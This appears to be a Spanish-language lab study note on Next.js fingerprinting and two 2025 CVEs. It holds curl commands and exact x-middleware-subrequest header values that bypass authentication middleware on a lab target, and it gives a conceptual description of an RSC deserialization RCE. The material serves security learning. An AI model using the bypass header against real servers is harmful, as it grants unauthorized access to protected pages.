---
tags: [web, nextjs, react, cve, middleware, pentesting, modern-web-stacks]
módulo: Modern Web Stacks · 
estado: ✅ Completado
---

# 🔷 React / Next.js — Stack y Vulnerabilidades

## 🤔 ¿Qué es Next.js y por qué importa?

Si en la tarea anterior Express era el motor del servidor, **Next.js es Express con superpoderes para React**.

Next.js añade capas encima de Express:

```
[Usuario]
    ↓
[Middleware]  ← guardia de seguridad (¿tienes permiso?)
    ↓
[App Router]  ← decide qué página mostrar
    ↓
[React Server Components] ← genera la página EN el servidor
    ↓
[Respuesta al navegador]
```

> 💡 La diferencia clave con Express puro: en Next.js, React **corre en el servidor**, no solo en el navegador. El servidor arma la página y la manda lista. Esto se llama **React Server Components (RSC)**.

---

## 🕵️ Identificar un servidor Next.js (Fingerprinting)

```bash
curl -I http://10.65.165.190:3001/
```

### Señales en la respuesta:

| Señal | Valor | Confianza |
|-------|-------|-----------|
| Header `X-Powered-By` | `Next.js` | 🔴 Alta |
| Código fuente HTML | `window.__next_f` en tag `<script>` | 🔴 Alta (confirma App Router) |
| Rutas de assets estáticos | `/_next/static/chunks/` | 🔴 Alta |
| Headers de middleware | `x-middleware-next` o `x-middleware-rewrite` | 🟡 Media |
| Redirección a ruta protegida | HTTP 307 a `/login` | 🟡 Media |

> ⚠️ **Importante:** Las CVEs de esta sala **solo aplican en producción** (`npm run build && npm start`). En modo desarrollo (`next dev`) NO son explotables.

---

## 🛡️ ¿Qué es el Middleware en Next.js?

El **middleware** es como un guardia en la puerta del edificio. Antes de que cualquier solicitud llegue a una página, el middleware la intercepta y decide:

- ¿Tienes una cookie de sesión válida? → pasa
- ¿No tienes sesión? → te mando a `/login`

```
[Tu solicitud]
      ↓
  [MIDDLEWARE]  ← se ejecuta PRIMERO siempre
  ¿Estás autenticado?
      ├── Sí → continúa a la página
      └── No → redirige a /login
```

En Next.js el middleware se define en un archivo llamado `middleware.ts` en la raíz del proyecto.

---

## 💀 CVE-2025-29927 — Bypass de Middleware (CVSS 9.1 Crítica)

### El problema en palabras simples

Next.js tiene un header interno llamado `x-middleware-subrequest`. Su función legítima es evitar bucles infinitos cuando el middleware se llama a sí mismo internamente.

**El fallo:** Next.js nunca verificaba si ese header venía de adentro del servidor o de un atacante externo. Si tú, como atacante, mandas ese header en tu solicitud, Next.js asume que ya pasó por el middleware y **lo salta por completo**.

```
SIN el header:
[Tu solicitud] → [Middleware: ¿autenticado? NO] → redirige a /login

CON el header malicioso:
[Tu solicitud + x-middleware-subrequest: middleware:middleware:...] 
    → [Next.js: "ah, ya pasó por el middleware"] 
    → página protegida entregada directamente ✅
```

### ¿Cuál es el valor del header?

Depende de dónde esté `middleware.ts`:

| Ubicación del archivo | Valor del header |
|----------------------|-----------------|
| Raíz del proyecto (`/middleware.ts`) | `middleware:middleware:middleware:middleware:middleware` |
| Dentro de `/src/` (`/src/middleware.ts`) | `src/middleware:src/middleware:src/middleware:src/middleware:src/middleware` |

El nombre se repite **5 veces** separado por `:`.

### Explotación

```bash
# 1. Confirmar que la ruta está protegida
curl -v http://10.65.165.190:3001/dashboard
# → redirige a /login (middleware funcionando)

# 2. Bypass con el header mágico
curl -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
     http://10.65.165.190:3001/dashboard
# → DashboardFlag: [REDACTED]  ← acceso sin credenciales
```

> 🔴 **Sin credenciales, sin fuerza bruta, sin token. Solo un header.**

---

## 💀 CVE-2025-55182 — RCE via RSC Flight Protocol (CVSS 10.0 Crítica)

### Contexto: ¿Qué es el RSC Flight Protocol?

Cuando Next.js con App Router manda una página generada en el servidor, la envía en un formato binario especial llamado **RSC Flight Protocol**. Es el "idioma" en que el servidor le habla al navegador para transmitir los componentes de React.

### El problema

Hay una vulnerabilidad de **deserialización insegura** en el analizador de ese protocolo. Afecta:
- Next.js 14 (>= 14.3.0-canary.77)
- Next.js 15.x (< 15.2.3)
- Combinado con React 19

**Deserialización insegura** = el servidor recibe datos en formato RSC Flight, los "desempaqueta" sin validarlos correctamente, y un atacante puede meter código malicioso en ese paquete que el servidor ejecuta.

### Impacto

- **RCE no autenticado** — ejecución de comandos en el servidor sin necesidad de login
- Fue usada en la campaña **Jackpot Panda**: desde reconocimiento (`id`, `whoami`) hasta robo de credenciales y despliegue de Cobalt Strike

> ℹ️ Esta CVE tiene una sala dedicada en THM: **CVE-2025-55182: React2Shell**. El análisis profundo de la explotación está fuera del alcance de esta tarea.

---

## 🧩 Comparativa Rápida: Express vs Next.js

| Aspecto | Express (MERN) | Next.js |
|---------|---------------|---------|
| Framework | Minimalista | Full-stack con React |
| React | Solo en el navegador | También en el servidor (RSC) |
| Autenticación | Middleware manual | Middleware integrado (`middleware.ts`) |
| Vulnerabilidad vista | Prototype Pollution | Middleware Bypass + RCE |
| Fingerprint clave | `X-Powered-By: Express` | `X-Powered-By: Next.js` + `window.__next_f` |

---

## 📌 Takeaways

> - **Next.js** es Express + React en el servidor. Usado en producción real por empresas grandes.
> - El **middleware** es el guardián de autenticación de Next.js; si lo bypaseas, lo bypaseas todo.
> - **CVE-2025-29927:** Un header que Next.js usa internamente puede ser enviado por cualquier atacante externo, saltando toda la autenticación. CVSS 9.1.
> - **CVE-2025-55182:** RCE por deserialización insegura en el protocolo RSC Flight. CVSS 10.0. Solo en producción con React 19.
> - Siempre verificar si `middleware.ts` está en raíz o en `/src/` para saber el valor exacto del header de bypass.
